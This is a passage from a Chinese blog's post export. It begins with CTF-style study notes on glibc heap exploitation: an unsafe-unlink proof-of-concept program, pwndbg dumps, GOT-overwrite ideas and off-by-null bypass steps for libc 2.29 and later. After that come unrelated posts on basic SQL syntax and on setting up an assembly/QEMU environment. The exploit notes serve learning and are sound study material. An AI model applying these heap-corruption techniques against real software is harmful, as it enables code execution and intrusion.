<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">uint64_t</span> *chunk0_ptr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">setbuf</span>(stdout, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> malloc_size = <span class="number">0x420</span>;</span><br><span class="line">  <span class="type">int</span> header_size = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">  chunk0_ptr = (<span class="type">uint64_t</span> *)<span class="built_in">malloc</span>(malloc_size);            <span class="comment">// chunk0</span></span><br><span class="line">  <span class="type">uint64_t</span> *chunk1_ptr = (<span class="type">uint64_t</span> *)<span class="built_in">malloc</span>(malloc_size);  <span class="comment">// chunk1</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The global chunk0_ptr is at %p, pointing to %p\n&quot;</span>, &amp;chunk0_ptr,</span><br><span class="line">         chunk0_ptr);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The victim chunk we are going to corrupt is at %p\n\n&quot;</span>, chunk1_ptr);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// fake_head</span></span><br><span class="line">  chunk0_ptr[<span class="number">1</span>] = chunk0_ptr[<span class="number">-1</span>] - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// fake fd &amp;&amp; fake bk</span></span><br><span class="line">  chunk0_ptr[<span class="number">2</span>] = (<span class="type">uint64_t</span>)&amp;chunk0_ptr - (<span class="built_in">sizeof</span>(<span class="type">uint64_t</span>) * <span class="number">3</span>);</span><br><span class="line">  chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>)&amp;chunk0_ptr - (<span class="built_in">sizeof</span>(<span class="type">uint64_t</span>) * <span class="number">2</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Fake chunk fd: %p\n&quot;</span>, (<span class="type">void</span> *)chunk0_ptr[<span class="number">2</span>]);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Fake chunk bk: %p\n\n&quot;</span>, (<span class="type">void</span> *)chunk0_ptr[<span class="number">3</span>]);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// chunk1 的 header 指针</span></span><br><span class="line">  <span class="type">uint64_t</span> *chunk1_hdr = chunk1_ptr - header_size;</span><br><span class="line">  <span class="comment">// chunk1 -&gt; prev_size</span></span><br><span class="line">  chunk1_hdr[<span class="number">0</span>] = malloc_size;   </span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(</span><br><span class="line">      <span class="string">&quot;If we had &#x27;normally&#x27; freed chunk0, chunk1.previous_size would have been &quot;</span></span><br><span class="line">      <span class="string">&quot;0x430, however this is its new value: %p\n&quot;</span>,</span><br><span class="line">      (<span class="type">void</span> *)chunk1_hdr[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// prev_inuse 为 0</span></span><br><span class="line">  chunk1_hdr[<span class="number">1</span>] &amp;= ~<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// unlink 发生</span></span><br><span class="line">  <span class="comment">// chunk0_ptr-&gt;fd = &amp;chunk0_ptr-0x18</span></span><br><span class="line">  <span class="comment">// 修改chunk0_ptr 可以修改 *(chunk0_ptr - 0x18 )的值</span></span><br><span class="line">  <span class="built_in">free</span>(chunk1_ptr);</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> victim_string[<span class="number">8</span>];</span><br><span class="line">  <span class="built_in">strcpy</span>(victim_string, <span class="string">&quot;Hello!~&quot;</span>);</span><br><span class="line">  chunk0_ptr[<span class="number">3</span>] = (<span class="type">uint64_t</span>)victim_string;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Original value: %s\n&quot;</span>, victim_string);</span><br><span class="line">  chunk0_ptr[<span class="number">0</span>] = <span class="number">0x4141414142424242</span>LL;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;New Value: %s\n&quot;</span>, victim_string);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// sanity check</span></span><br><span class="line">  <span class="built_in">assert</span>(*(<span class="type">long</span> *)victim_string == <span class="number">0x4141414142424242</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>比较绕，但是可以直接看最后的结果，<code>chunk0_ptr-&gt;bk-&gt;fd = chunk0_ptr-&gt;fd</code>。target 的内容存放着 <code>&amp;target-0x10</code> target的地址减去0x18</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># chunk0_ptr 堆地址</span></span><br><span class="line">pwndbg&gt; x/8xg 0x405290  </span><br><span class="line">0x405290:       0x0000000000000000      0x0000000000000431</span><br><span class="line">0x4052a0:       0x0000000000000000      0x0000000000020d61</span><br><span class="line">0x4052b0:       0x0000000000404050      0x0000000000404058    <span class="comment"># fake_fd fake_bk</span></span><br><span class="line">0x4052c0:       0x0000000000000000      0x0000000000000000</span><br><span class="line"></span><br><span class="line"><span class="comment"># &amp;chunk0_ptr</span></span><br><span class="line"><span class="comment"># (&amp;chunk0_ptr - 0x10) -&gt; fd = fake_fd</span></span><br><span class="line">pwndbg&gt; x/8xg 0x0000000000404058+0x10   </span><br><span class="line">0x404068 &lt;chunk0_ptr&gt;:  0x0000000000404050      0x0000000000000000</span><br><span class="line">0x404078:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x404088:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x404098:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>结论：target 指针指向 &amp;target-0x18。我见过的问题一般利用在全局指针数组中，通过这种方式修改got表内容。<br>改<code>arr[0]</code>，这样就可以修改和读取 <code>arr[0]</code> 。改成got表，读取内容，泄露地址，又可以修改就直接修改got表内容。<br><del>没有所有权的编程是这样的</del></p>
<h3 id="off-by-null"><a href="#off-by-null" class="headerlink" title="off by null"></a>off by null</h3><p>也是堆溢出的一种形式，但还是区分一下。在这里可以攻击保护全开的程序，主要利用点为堆可以合并。</p>
<p>libc2.29 以前</p>
<ul>
<li>先释放chunk A.</li>
<li>通过chunk B,利用off by one漏洞在 修改chunk C presize 值为 chunk A size +chunk B size的同时,将chunk C的prev_inuse值覆盖为0.</li>
<li>再释放chunk C。</li>
</ul>
<p>libc2.29 以后有个检查，会检查prev_chunk size是否和当前的 chunk 的 prev_size 相同，而 off by null，我们无法直接改变 chunk size，因此我们在chunk里伪造一个chunk</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (__glibc_unlikely(<span class="built_in">chunksize</span>(p) != prevsize))</span><br></pre></td></tr></table></figure>

<p>修改后的off by null利用手段，因为没有arena的检查，只是检查了in_use位和size相关检查</p>
<ul>
<li>三个堆 A，B，C，最好是 0x438 这种不是整数类型的，会存在一段公用的结果。c防止与top_chunk合并</li>
<li>编辑A，在A中<strong>伪造一个堆</strong>，覆盖掉B的prev_inuse 位</li>
<li>free掉B，就会向后合并。</li>
<li>但是需要绕过unlink_chunk中对fd, bk检查 <code>__builtin_expect(fd-&gt;bk != p || bk-&gt;fd != p, 0)</code>。</li>
</ul>
<p>简单点的题目会给我们一个基地址，这里我们就可以直接像unlink一样修改fd,bk就行</p>
<ul>
<li>tcache leak 在libc 2.32 需要 <code>(fd&gt;&gt;12) ^ 0</code></li>
<li>unsorted bin 存在两个chunk，泄露其中一个的 fd,bk可以得到堆地址</li>
<li>largebin 的四个指针，只有一个chunk可以使用fd_nextsize 和 bk_nextsize指向自己</li>
</ul>
<p>在比较苛刻的条件下，我们不能泄露堆地址，但是可以通过布局heap fengshui 进行伪造fake chunk。假设程序存在off by null</p>
<ul>
<li>a-x-b-c-x-d-x, a,b,c,d 大小都在unsorted bin里，x是避免合并的chunk （c&gt;d&gt;a&#x3D;b）</li>
<li>free a, c, d 拿fd来说就是形成 d-&gt;c-&gt;a-&gt;arena 的链表。</li>
<li>free b 这时候b,c合并。变成了 b-&gt;d-&gt;a-&gt;arena 链表，但是这时候c的指针并没有清除。</li>
<li>unsorted bin FIFO。此处需要将 a，d放入largebin里，然后切割 b-c，生成e，e包含c的 fd, bk指针。</li>
<li>清空unsorted bin 获得f</li>
<li>编辑 e，可以改原来c位置的size，并且同时包含了fd, bk 指针。因此此处我们需要改一点完成unlink中的检查。</li>
<li>之前chunk c-&gt;fd&#x3D;a, c-&gt;bk&#x3D;d。因为其放入了largebin里 a-&gt;bk &#x3D; d， d-&gt;fd &#x3D; a，无法通过检查，因此我们需要想办法满足条件</li>
<li>将a,d从large bin 拿出来。</li>
<li>bypass bk指针：free a, free f。a-&gt;bk &#x3D; f, 将a拿出来，不会清空指针，修改一下bk指针，因为f和c距离比较近，因此我们可以通过partial write修改bk</li>
<li>bypass fd指针: 直接向bypass bk一样，bk指向的是arena。free f, free d，d-&gt;fd&#x3D;f。让后让其进入largebin里，d-&gt;fd&#x3D;f。拿回d就行<ul>
<li>这里为什么不在unsortbin里：直接拿出d，会先将f放入largebin，然后d-&gt;arena 形成链表。先拿f再拿出d, d-&gt;arena链表。都破坏了fd指针（没有指向堆。</li>
</ul>
</li>
</ul>
<p>可以使用这段代码调试，没有指针改变，主要看的是可行性。</p>
<ul>
<li>最好重新分布一下size，最简单是修改 <code>x0</code> 大小。保证f和c 只有最后一个字节不同</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="type">void</span> *a = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="type">void</span> *x0 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="type">void</span> *b = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  <span class="type">void</span> *c = <span class="built_in">malloc</span>(<span class="number">0x438</span>);  </span><br><span class="line">  <span class="type">void</span> *x1 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">  <span class="type">void</span> *d = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line">  <span class="type">void</span> *x2 = <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(a);</span><br><span class="line">  <span class="built_in">free</span>(c);</span><br><span class="line">  <span class="built_in">free</span>(d);</span><br><span class="line">  <span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *e = <span class="built_in">malloc</span>(<span class="number">0x438</span>);   <span class="comment">// 切割 b-c</span></span><br><span class="line">  <span class="type">void</span> *f = <span class="built_in">malloc</span>(<span class="number">0x418</span>);  <span class="comment">// 清除unsorted bin</span></span><br><span class="line">  d = <span class="built_in">malloc</span>(<span class="number">0x428</span>);        <span class="comment">// largebin 获得 p4</span></span><br><span class="line">  a = <span class="built_in">malloc</span>(<span class="number">0x418</span>);        <span class="comment">// large bin 获得 p1</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(a);</span><br><span class="line">  <span class="built_in">free</span>(f); <span class="comment">// p1-&gt;bk = </span></span><br><span class="line">  a = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">  f = <span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(f);</span><br><span class="line">  <span class="built_in">free</span>(d);</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">malloc</span>(<span class="number">0x1000</span>); <span class="comment">// large bin</span></span><br><span class="line"></span><br><span class="line">  d = <span class="built_in">malloc</span>(<span class="number">0x428</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>bk bypass</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p f</span><br><span class="line"><span class="variable">$2</span> = (void *) 0x555555559b20</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/8xg 0x555555559b20-0x30</span><br><span class="line">0x555555559af0: 0x0000000000000000      0x0000000000000441</span><br><span class="line">0x555555559b00: 0x0000555555559290      0x0000555555559f50</span><br><span class="line">0x555555559b10: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x555555559b20: 0x00007ffff7e1a0d0      0x00007ffff7e1a0d0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里bk需要覆盖2byte才行，可以优化size，让其只覆盖1byte就行。</span></span><br><span class="line">pwndbg&gt; x/4xg 0x0000555555559290</span><br><span class="line">0x555555559290: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x5555555592a0: 0x00007ffff7e19ce0      0x0000555555559b10</span><br></pre></td></tr></table></figure>

<p>fd bypass</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; p f</span><br><span class="line"><span class="variable">$1</span> = (void *) 0x555555559b20</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/8xg 0x555555559b20-0x30</span><br><span class="line">0x555555559af0: 0x0000000000000000      0x0000000000000441</span><br><span class="line">0x555555559b00: 0x0000555555559290      0x0000555555559f50</span><br><span class="line">0x555555559b10: 0x0000000000000000      0x0000000000000421</span><br><span class="line">0x555555559b20: 0x00007ffff7e1a0d0      0x00007ffff7e1a0d0</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里就是fd</span></span><br><span class="line">pwndbg&gt; x/8xg 0x0000555555559f50</span><br><span class="line">0x555555559f50: 0x0000000000000000      0x0000000000000431</span><br><span class="line">0x555555559f60: 0x0000555555559b10      0x00007ffff7e1a0d0</span><br><span class="line">0x555555559f70: 0x0000555555559b10      0x0000555555559b10</span><br><span class="line">0x555555559f80: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<h2 id="kernel"><a href="#kernel" class="headerlink" title="kernel ?"></a>kernel ?</h2><ul>
<li>kernel 存在很多的 list_head 结构体，我们可以使用 <strong>条件竞争</strong> 来修改指针，借助如同 msg_msg 结构体来进行任意地址写</li>
</ul>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
<li><a href="https://www.anquanke.com/post/id/197635">How2Heap堆利用学习笔记（三）：Unsafe_unlink</a></li>
<li><a href="https://xie-yuanhao.gitee.io/2023/06/27/Pwn-%E5%A0%86%E5%9F%BA%E7%A1%80-Unsafe%20Unlink/">PWN-堆基础之Unsafe Unlink)</a></li>
<li><a href="https://blog.wjhwjhn.com/archives/193/">glibc 2.29-2.32 off by null bypass</a></li>
</ul>
]]></content>
      <categories>
        <category>CSE</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>常用数据库基本语法</title>
    <url>/2023/06/30/%E5%B8%B8%E7%94%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<blockquote>
<p>简单学习增删改查</p>
</blockquote>
<span id="more"></span>

<ul>
<li><p>三个最广泛使用的开源 RDBMS：SQLite、MySQL 和 PostgreSQL。关系型数据库</p>
</li>
<li><p>因为SQL的标准，三个数据库差不多的语法。</p>
</li>
</ul>
<h1 id="SQL"><a href="#SQL" class="headerlink" title="SQL"></a>SQL</h1><h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><blockquote>
<p>其实是开源 MariaDB</p>
</blockquote>
<ul>
<li>数据库</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建</span></span><br><span class="line"><span class="keyword">CREATE</span> DATABASE db_name; </span><br><span class="line"></span><br><span class="line"><span class="comment">-- 删除</span></span><br><span class="line"><span class="keyword">DROP</span> DATABASE db_name;   </span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查看</span></span><br><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 连接</span></span><br><span class="line">use database_name;</span><br></pre></td></tr></table></figure>

<ul>
<li>表</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_name (</span><br><span class="line">	column_name data_type 属性 </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">SHOW</span> tables;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 删除</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> table_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查询</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">from</span> table_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 增加</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">into</span> table_name(column_name) <span class="keyword">values</span>(&quot;xxx&quot;);</span><br></pre></td></tr></table></figure>

<ul>
<li><p>数据类型</p>
</li>
<li><p>查询限定</p>
</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 排序</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 属性限定</span></span><br><span class="line"><span class="keyword">WHERE</span>, <span class="keyword">AND</span>, <span class="keyword">OR</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 结果个数</span></span><br><span class="line">limit</span><br></pre></td></tr></table></figure>

<h2 id="PostgreSQL"><a href="#PostgreSQL" class="headerlink" title="PostgreSQL"></a>PostgreSQL</h2><ul>
<li>数据库</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建</span></span><br><span class="line"><span class="keyword">CREATE</span> DATABASE db_name; </span><br><span class="line"></span><br><span class="line"><span class="comment">-- 删除</span></span><br><span class="line"><span class="keyword">DROP</span> DATABASE db_name;   </span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查看</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 连接</span></span><br></pre></td></tr></table></figure>

<ul>
<li>表</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 创建</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> table_name (</span><br><span class="line">	column_name data_type 属性 </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 删除</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> table_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查询</span></span><br><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">from</span> table_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 增加</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">into</span> table_name(column_name) <span class="keyword">values</span>(&quot;xxx&quot;);</span><br></pre></td></tr></table></figure>

<ul>
<li>查询</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 排序</span></span><br><span class="line"><span class="keyword">order</span> <span class="keyword">by</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 去重</span></span><br><span class="line"><span class="keyword">distinct</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 属性限定</span></span><br><span class="line"><span class="keyword">WHERE</span>, <span class="keyword">AND</span>, <span class="keyword">OR</span></span><br></pre></td></tr></table></figure>

<h2 id="SQLite"><a href="#SQLite" class="headerlink" title="SQLite"></a>SQLite</h2><ul>
<li><p>sqlite3</p>
</li>
<li><p>命令</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.help;     -- 帮助信息</span><br><span class="line"></span><br><span class="line">.open test.db;  -- 打开文件，如果没有就创建</span><br><span class="line"></span><br><span class="line">.show;     -- 显示一系列属性</span><br><span class="line"></span><br><span class="line">.quit   -- 退出</span><br><span class="line"></span><br><span class="line">.databases  -- 显示数据库</span><br></pre></td></tr></table></figure>

<ul>
<li>创建数据库</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 读取或者创建</span><br><span class="line">sqlite3 name</span><br><span class="line">.open name</span><br></pre></td></tr></table></figure>

<ul>
<li>导入导出数据库</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.dump   -- 将数据库导出SQL 文件 </span><br><span class="line">sqlite3 test.db .dump &gt; test.sql</span><br><span class="line">sqlite3 test.db &lt; test.db</span><br></pre></td></tr></table></figure>

<ul>
<li>创建表</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.tables  -- 显示表</span><br><span class="line">.schema  -- 表的信息</span><br><span class="line"></span><br><span class="line">CREATE TABLE table_name (</span><br><span class="line">	column_name type primary key</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">DROP TABLE database.table_name;</span><br><span class="line"></span><br><span class="line">INSERT INTO table_name(&quot;cloumn_name&quot;) values (&quot;value&quot;)</span><br></pre></td></tr></table></figure>

<ul>
<li>查询</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 还是SELECT 语句</span><br></pre></td></tr></table></figure>

<h1 id="编程操作"><a href="#编程操作" class="headerlink" title="编程操作"></a>编程操作</h1><ul>
<li>使用C语言操作数据库，其余编程语言操作数据库也差不多，主要是写SQL语句的操作。</li>
</ul>
]]></content>
      <categories>
        <category>CS</category>
      </categories>
      <tags>
        <tag>Database</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编学习</title>
    <url>/2023/06/10/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<blockquote>
<p>基本的汇编学习。</p>
</blockquote>
<span id="more"></span>

<ul>
<li><p>学习目标：首先能看懂。然后尝试编写 <code>shellcode</code>。</p>
</li>
<li><p>个人习惯小写指令。</p>
</li>
<li><p><code>little-endian</code></p>
</li>
<li><p>常见的汇编格式</p>
<ul>
<li>Intel格式。</li>
<li>AT&amp;T，实际使用也很常见(Linux中默认的格式)</li>
</ul>
</li>
<li><p>部分名词</p>
</li>
</ul>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ISA: Instruction Set Architecture, 指令集架构</span><br><span class="line">RISC: Reduced Instruction Set Computer, 精简指令集计算机</span><br><span class="line">CISC: Complex Instruction Set Computer, 复杂指令集计算机</span><br><span class="line">ABI: application binary interface</span><br></pre></td></tr></table></figure>

<h2 id="环境问题"><a href="#环境问题" class="headerlink" title="环境问题"></a>环境问题</h2><ul>
<li><p>本机 linux: ubuntu &amp;&amp; kali virtual machine；CPU: AMD。</p>
<ul>
<li>无法直接运行 <code>arm</code> 和 <code>mips</code> 架构的程序</li>
</ul>
</li>
<li><p>arm可以使用手机终端 <a href="https://termux.dev/en/">Termux</a> 进行运行。或者购买云服务器?</p>
</li>
</ul>
<h3 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h3><ul>
<li><p>基本环境 <code>user mode+kernel mode</code>。 </p>
<ul>
<li>运行程序只需要一个<code>qemu-user</code> 就行，启动系统需要 <code>qemu-system-xxx</code></li>
<li>甚至可以 <code>qemu-system</code> 跑kernel，然后跑程序😂<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># qemu user用户态 system启动内核镜像</span></span><br><span class="line">sudo apt install qemu-user</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>arm 环境</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># gun 编译工具链 + 动态链接库</span></span><br><span class="line">sudo apt list gcc* | grep arm</span><br><span class="line">sudo apt install gcc-arm-linux-gnueabi gcc-aarch64-linux-gnu</span><br><span class="line"></span><br><span class="line"><span class="comment"># optional: qemu arm system mode</span></span><br><span class="line">sudo apt list  <span class="string">&quot;qemu*&quot;</span> <span class="comment"># 寻找对用的arch</span></span><br><span class="line">sudo apt install qemu-system-arm qemu-system-aarch64</span><br></pre></td></tr></table></figure>

<ul>
<li>mips 环境.</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># gun 编译工具链</span></span><br><span class="line">sudo apt install gcc-mips-linux-gnu gcc-mips64-linux-gnuabi64 gcc-mipsel-linux-gnu gcc-mips64el-linux-gnuabi64</span><br><span class="line"></span><br><span class="line"><span class="comment"># optional: qemu mips system mode, 目前没见过， user mode 应该够了</span></span><br><span class="line">sudo apt install qemu-system-mips</span><br></pre></td></tr></table></figure>

<ul>
<li>gdb</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install gdb gdb-multiarch</span><br></pre></td></tr></table></figure>

<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><ul>
<li><p>qemu-user 使用 <code>-g</code> gdb模式 确定gdb调试端口</p>
</li>
<li><p>qemu-system 使用 <code>-s -S  或者 -gdb tcp:1234</code> gdbserver等待连接，默认端口 <code>1234</code></p>
</li>
<li><p>编程测试</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;hello, world!&quot;</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>寻找动态链接库。<code>lib-&gt;/usr/lib</code> 的链接</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">ls</span> -al /usr/lib | grep arm  <span class="comment"># aarch64 mips...</span></span><br></pre></td></tr></table></figure>

<ul>
<li>arm 测试，不知为什么，测试时 <code>-g</code>放前面才成功</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 编译</span></span><br><span class="line">arm-linux-gnueabi-gcc hello.c -o helloarm -g</span><br><span class="line">aarch64-linux-gnu-gcc hello.c -o helloaarch -g</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行</span></span><br><span class="line">$ qemu-arm -L /usr/arm-linux-gnueabi ./helloarm</span><br><span class="line">$ qemu-aarch64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调试</span></span><br><span class="line">$ qemu-arm -g 1234 -L /usr/arm-linux-gnueabi ./helloarm </span><br><span class="line">$ gdb-multiarch</span><br><span class="line">gdb&gt; <span class="built_in">set</span> <span class="built_in">arch</span> arm <span class="comment"># aarch64</span></span><br><span class="line">gdb&gt; target remote localhost:1234</span><br><span class="line">xxx </span><br></pre></td></tr></table></figure>

<ul>
<li>mips 测试, 与arm类似</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ mips-linux-gnu-gcc hello.c -o hellomips -g</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><ul>
<li>CISC</li>
</ul>
<h3 id="x86-1"><a href="#x86-1" class="headerlink" title="x86"></a>x86</h3><ul>
<li>intel x86 通用寄存器</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 通用</span><br><span class="line">eax: 累加器</span><br><span class="line">ebx: 一般基址寄存器，base</span><br><span class="line">ecx: counter, 在loop时，默认计数</span><br><span class="line">edx: 一般用于存放data</span><br><span class="line"></span><br><span class="line">esi: source index, 处理字符串常用</span><br><span class="line">edi: destinatin index, 处理字符串常用</span><br><span class="line"></span><br><span class="line">esp: stack pointer, 栈顶</span><br><span class="line">ebp: base pointer, 栈基址</span><br><span class="line"></span><br><span class="line">eip: 指向将要执行的指令。</span><br></pre></td></tr></table></figure>

<ul>
<li>标志位 <code>eflags</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CF: carry flag, 进位</span><br><span class="line">ZF: zero, 0</span><br><span class="line">SF: sign, 符号</span><br><span class="line">OF: overflow, 溢出</span><br><span class="line">TF: trap, 跟踪</span><br><span class="line">IF: interrupt, 中断</span><br><span class="line">PF: parity, 奇偶</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<ul>
<li>段寄存器</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cs: code segment 代码段</span><br><span class="line">ds: data 数据段</span><br><span class="line">ss: stack 堆栈段</span><br><span class="line">es: extend 扩展段</span><br><span class="line">fs: 数据段</span><br><span class="line">gs: 数据段</span><br></pre></td></tr></table></figure>

<ul>
<li>控制寄存器</li>
</ul>
